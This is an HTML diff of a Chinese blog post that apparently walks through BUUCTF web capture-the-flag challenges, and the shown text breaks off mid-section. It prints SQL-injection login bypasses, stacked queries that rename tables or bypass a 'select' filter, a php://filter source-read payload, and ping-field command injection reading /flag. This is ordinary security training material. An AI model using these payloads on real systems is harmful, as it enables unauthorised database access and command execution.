@@ -1,0 +1,957 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="一、EasySQL                           🔺SQL注入登录       简单的SQL注入                     1.查看网页源代码        可以看到是check.php在对登录按钮进行操作，使用的方法是GET，加上题目提示是SQL注入，所以就直接尝试SQL注入。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="陪XX的WebBUU刷题(一)">
+<meta property="og:url" content="http://pig-007.github.io/2022/01/06/%E9%99%AAXX%E7%9A%84WebBUU%E5%88%B7%E9%A2%98(%E4%B8%80)/index.html">
+<meta property="og:site_name" content="PIG-007">
+<meta property="og:description" content="一、EasySQL                           🔺SQL注入登录       简单的SQL注入                     1.查看网页源代码        可以看到是check.php在对登录按钮进行操作，使用的方法是GET，加上题目提示是SQL注入，所以就直接尝试SQL注入。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061346044.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061346998.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061423772.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071147850.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071149004.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071209055.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071210256.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071216007.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071218337.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071253029.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071623241.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071629819.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071629659.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071642873.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071642355.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071711484.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071717419.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091203487.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091204354.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091206984.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091206321.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091207995.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091210479.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091211532.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091834445.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091835473.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091836077.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091837080.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091838079.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102003467.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102004540.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102021256.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111127902.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111136396.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111136522.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111449555.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111451527.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111451771.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111452893.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111412036.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111412596.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111413501.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111414701.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111415489.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111417813.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111418470.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111418007.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111420138.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111420811.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111422737.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111422352.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121202373.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121202287.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121204190.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121206053.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121207056.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121210799.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121210905.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121213219.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121218740.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121906058.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121912749.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131203691.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131156038.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131156886.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131211277.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131212797.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131507999.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131518370.png">
+<meta property="article:published_time" content="2022-01-06T02:25:33.000Z">
+<meta property="article:modified_time" content="2022-01-14T02:52:15.069Z">
+<meta property="article:author" content="PIG-007">
+<meta property="article:tag" content="陪XX的WebBUU刷题">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061346044.png"><title>陪XX的WebBUU刷题(一) | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2022/01/06/%E9%99%AAXX%E7%9A%84WebBUU%E5%88%B7%E9%A2%98(%E4%B8%80)/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":true},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">陪XX的WebBUU刷题(一)</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-01-14</span></span></div></header><div class="post-body">
+        <h1 id="一、EasySQL"   >
+          <a href="#一、EasySQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、EasySQL" class="headerlink" title="一、EasySQL"></a>一、EasySQL</h1>
+      
+        <h2 id="🔺SQL注入登录"   >
+          <a href="#🔺SQL注入登录" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺SQL注入登录" class="headerlink" title="🔺SQL注入登录"></a>🔺SQL注入登录</h2>
+      <p>简单的SQL注入</p>
+
+        <h2 id="1-查看网页源代码"   >
+          <a href="#1-查看网页源代码" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-查看网页源代码" class="headerlink" title="1.查看网页源代码"></a>1.查看网页源代码</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061346044.png" alt="image-20220106105755040"></p>
+<p>可以看到是check.php在对登录按钮进行操作，使用的方法是GET，加上题目提示是SQL注入，所以就直接尝试SQL注入。</p>
+
+        <h2 id="2-注入原理"   >
+          <a href="#2-注入原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-注入原理" class="headerlink" title="2.注入原理"></a>2.注入原理</h2>
+      <p>由于SQL注入中涉及单引号和双引号，且对字符串的处理基本都是单引号进行处理，检测一下，倘若我们使用双引号进行注入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=aaa&#x27; or &quot;1&quot;=&quot;1&amp;password=aaa&#x27; or &quot;1&quot;=&quot;1</span><br></pre></td></tr></table></div></figure>
+
+<p>那么出现如下错误</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061346998.png" alt="image-20220106110800649"></p>
+<p>那么采用单引号进行注入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=aaa&#x27; or &#x27;1&#x27;=&#x27;1&amp;password=aaa&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></div></figure>
+
+<p>之后即可成功</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061423772.png" alt="image-20220106142353692"></p>
+<p>二、</p>
+<p>1.HTML标签</p>
+<p>meta标签</p>
+
+        <h1 id="三、-极客大挑战-2019-Havefun1"   >
+          <a href="#三、-极客大挑战-2019-Havefun1" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、-极客大挑战-2019-Havefun1" class="headerlink" title="三、[极客大挑战 2019]Havefun1"></a>三、[极客大挑战 2019]Havefun1</h1>
+      
+        <h2 id="🔺简单查询"   >
+          <a href="#🔺简单查询" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺简单查询" class="headerlink" title="🔺简单查询"></a>🔺简单查询</h2>
+      <p>查看源代码，跳过css和style部分</p>
+<p>可以看到注释部分的提示</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071147850.png" alt="image-20220107114730804"></p>
+<p>即当cat=dog时，就会输出Syc{cat_cat_cat}，但是一般这都是作者给的提示，实际输出内容可能不是Syc{cat_cat_cat}，所以先尝试一波</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/index.php?cat=dog</span><br></pre></td></tr></table></div></figure>
+
+<p>直接出flag了</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071149004.png" alt="image-20220107114926958"></p>
+
+        <h1 id="四、-ACTF2020-新生赛-Include"   >
+          <a href="#四、-ACTF2020-新生赛-Include" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、-ACTF2020-新生赛-Include" class="headerlink" title="四、[ACTF2020 新生赛]Include"></a>四、[ACTF2020 新生赛]Include</h1>
+      
+        <h2 id="🔺PHP伪协议"   >
+          <a href="#🔺PHP伪协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺PHP伪协议" class="headerlink" title="🔺PHP伪协议"></a>🔺PHP伪协议</h2>
+      
+        <h2 id="1-前置探索"   >
+          <a href="#1-前置探索" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前置探索" class="headerlink" title="1.前置探索"></a>1.前置探索</h2>
+      <p>点击tips之后发现输出提示，获取到使用file协议的flag.php</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071209055.png" alt="image-20220107120937019"></p>
+<p>查看flag.php的网页源代码但是什么也没有</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071210256.png" alt="image-20220107121010226"></p>
+<p>之后尝试利用php的伪协议来读取flag.php的源代码</p>
+
+        <h2 id="2-php伪协议利用"   >
+          <a href="#2-php伪协议利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-php伪协议利用" class="headerlink" title="2.php伪协议利用"></a>2.php伪协议利用</h2>
+      <p>这个比较复杂，之后再专门总结一下，反正这里涉及了file，那么尝试用该协议的payload来读取</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></div></figure>
+
+<p>这里给出的是比较普遍性的，用base64来进行获取的，读取之后得到base64编码的一串字符</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071216007.png" alt="image-20220107121629962"></p>
+
+        <h2 id="3-base64解码"   >
+          <a href="#3-base64解码" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-base64解码" class="headerlink" title="3.base64解码"></a>3.base64解码</h2>
+      <p>获取到上面的base64编码后，运用CyberChef解码即可得到flag</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071218337.png" alt="image-20220107121805266"></p>
+
+        <h1 id="五、-强网杯-2019-随便注1"   >
+          <a href="#五、-强网杯-2019-随便注1" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、-强网杯-2019-随便注1" class="headerlink" title="五、[强网杯 2019]随便注1"></a>五、[强网杯 2019]随便注1</h1>
+      
+        <h2 id="🔺SQL注入-三种姿势"   >
+          <a href="#🔺SQL注入-三种姿势" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺SQL注入-三种姿势" class="headerlink" title="🔺SQL注入+三种姿势"></a>🔺SQL注入+三种姿势</h2>
+      <p>可以先用单引号判断是否存在SQL注入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=1&#x27;</span><br></pre></td></tr></table></div></figure>
+
+<p>出现如下，出错则代表存在</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071253029.png" alt="image-20220107125314983"></p>
+<p>那么先查询存在的表</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=&#x27;;show tables;#</span><br></pre></td></tr></table></div></figure>
+
+<p>发现有如下两个表</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071623241.png" alt="image-20220107162320203"></p>
+<p>然后分别查看一下对应的</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=&#x27;;show columns from words;#</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071629819.png" alt="image-20220107162923778"></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=&#x27;;show columns from `1919810931114514`;#</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071629659.png" alt="image-20220107162957623"></p>
+<p>那么flag就在表1919810931114514中，注意查询数字表的时候需要加<strong>反引号`</strong></p>
+
+        <h2 id="解析words表"   >
+          <a href="#解析words表" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析words表" class="headerlink" title="解析words表"></a>解析words表</h2>
+      <p>那么由于输入1，2会出现如下数据</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071642873.png" alt="image-20220107164211829"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071642355.png" alt="image-20220107164221323"></p>
+<p>这里的第二个数据段是字符型，那么就应该是在表words中，此时就大概是如下的表格</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>id</th>
+<th>data</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>hahahah</td>
+</tr>
+<tr>
+<td>2</td>
+<td>miaomiaomiao</td>
+</tr>
+</tbody></table></div>
+
+        <h2 id="解析1919810931114514表"   >
+          <a href="#解析1919810931114514表" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析1919810931114514表" class="headerlink" title="解析1919810931114514表"></a>解析<code>1919810931114514</code>表</h2>
+      <p>依据列大概猜测如下</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>flag</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>………..不知</td>
+</tr>
+</tbody></table></div>
+<p>这里select被过滤了，无法直接从表1919810931114514中获取所以尝试一下其他的解法。</p>
+
+        <h2 id="1-解法一-改表"   >
+          <a href="#1-解法一-改表" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-解法一-改表" class="headerlink" title="1.解法一(改表)"></a>1.解法一(改表)</h2>
+      <p>修改表名字，使得保存flag的表1919810931114514名字变为表words，之后把flag字段变为data字段，添加id字段，输入1,2然后就可以打印出flag了。</p>
+
+        <h3 id="1-改名"   >
+          <a href="#1-改名" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-改名" class="headerlink" title="(1)改名"></a>(1)改名</h3>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=1&#x27;; rename table words to word1; rename table `1919810931114514` to words;#</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="2-增添id字段"   >
+          <a href="#2-增添id字段" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-增添id字段" class="headerlink" title="(2)增添id字段"></a>(2)增添id字段</h3>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=1&#x27;; alter table words add id int unsigned not Null auto_increment primary key;#</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="3-修改flag为data字段"   >
+          <a href="#3-修改flag为data字段" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-修改flag为data字段" class="headerlink" title="(3)修改flag为data字段"></a>(3)修改flag为data字段</h3>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=1&#x27;;alert table words change flag data varchar(100);#</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="总的payload"   >
+          <a href="#总的payload" class="heading-link"><i class="fas fa-link"></i></a><a href="#总的payload" class="headerlink" title="总的payload"></a>总的payload</h3>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=1&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key;alert table words change flag data varchar(100);#</span><br></pre></td></tr></table></div></figure>
+
+<p>最后输入1提交即可</p>
+
+        <h2 id="2-解法二-open和handler"   >
+          <a href="#2-解法二-open和handler" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-解法二-open和handler" class="headerlink" title="2.解法二(open和handler)"></a>2.解法二(open和handler)</h2>
+      <p>利用open和handle关键字</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#</span><br></pre></td></tr></table></div></figure>
+
+<p>这样可以直接读出来表<code>1919810931114514</code>的所有内容</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071711484.png" alt="image-20220107171100441"></p>
+
+        <h2 id="3-解法三-MySQL的预处理"   >
+          <a href="#3-解法三-MySQL的预处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-解法三-MySQL的预处理" class="headerlink" title="3.解法三(MySQL的预处理)"></a>3.解法三(MySQL的预处理)</h2>
+      <p>利用预处理机制prepare和concat拼接获得select操作，之后execute来执行，这里好像不能小写，可以通过大写来绕过</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=&#x27;;PREPARE st from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` </span><br><span class="line">&#x27;);EXECUTE st;#</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071717419.png" alt="image-20220107171702374"></p>
+
+        <h1 id="六、-SUCTF-2019-EasySQL"   >
+          <a href="#六、-SUCTF-2019-EasySQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、-SUCTF-2019-EasySQL" class="headerlink" title="六、[SUCTF 2019]EasySQL"></a>六、[SUCTF 2019]EasySQL</h1>
+      <p>涉及知识点有点多</p>
+
+        <h1 id="七、-ACTF2020-新生赛-Exec"   >
+          <a href="#七、-ACTF2020-新生赛-Exec" class="heading-link"><i class="fas fa-link"></i></a><a href="#七、-ACTF2020-新生赛-Exec" class="headerlink" title="七、[ACTF2020 新生赛]Exec"></a>七、[ACTF2020 新生赛]Exec</h1>
+      
+        <h2 id="🔺命令执行-寻找flag"   >
+          <a href="#🔺命令执行-寻找flag" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺命令执行-寻找flag" class="headerlink" title="🔺命令执行+寻找flag"></a>🔺命令执行+寻找flag</h2>
+      
+        <h2 id="1-远程命令执行"   >
+          <a href="#1-远程命令执行" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-远程命令执行" class="headerlink" title="1.远程命令执行"></a>1.远程命令执行</h2>
+      <p>一般这种ping的界面，都可能会涉及到命令执行</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091203487.png" alt="image-20220109120351450"></p>
+<p>那么直接尝试一下即可，ping一下本地回环地址</p>
+<p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;pwd</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091204354.png" alt="image-20220109120428320"></p>
+<p>可以看到存在远程命令执行，那么就尝试找flag在哪，也就是一个路径搜索。</p>
+
+        <h2 id="2-搜索flag路径"   >
+          <a href="#2-搜索flag路径" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-搜索flag路径" class="headerlink" title="2.搜索flag路径"></a>2.搜索flag路径</h2>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091206984.png" alt="image-20220109120604954"></p>
+<p>那么去根目录找</p>
+<p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls /</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091206321.png" alt="image-20220109120649283"></p>
+<p>可以看到flag，那么直接cat即可</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat /flag</span><br></pre></td></tr></table></div></figure>
+
+<p>得到flag</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091207995.png" alt="image-20220109120742963"></p>
+
+        <h1 id="八、-极客大挑战-2019-Secret-File"   >
+          <a href="#八、-极客大挑战-2019-Secret-File" class="heading-link"><i class="fas fa-link"></i></a><a href="#八、-极客大挑战-2019-Secret-File" class="headerlink" title="八、[极客大挑战 2019]Secret File"></a>八、[极客大挑战 2019]Secret File</h1>
+      
+        <h2 id="🔺抓包-伪协议"   >
+          <a href="#🔺抓包-伪协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺抓包-伪协议" class="headerlink" title="🔺抓包+伪协议"></a>🔺抓包+伪协议</h2>
+      
+        <h2 id="1-前期探索"   >
+          <a href="#1-前期探索" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前期探索" class="headerlink" title="1.前期探索"></a>1.前期探索</h2>
+      <p>查看源代码，有如下文件，访问一下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091210479.png" alt="image-20220109121055447"></p>
+<p>接着按照提示，但是直接跳转到了</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091211532.png" alt="image-20220109121144475"></p>
+<p>那么中间可能执行太快，这时候就需要抓包来看看具体是怎么执行的。</p>
+
+        <h2 id="2-抓包"   >
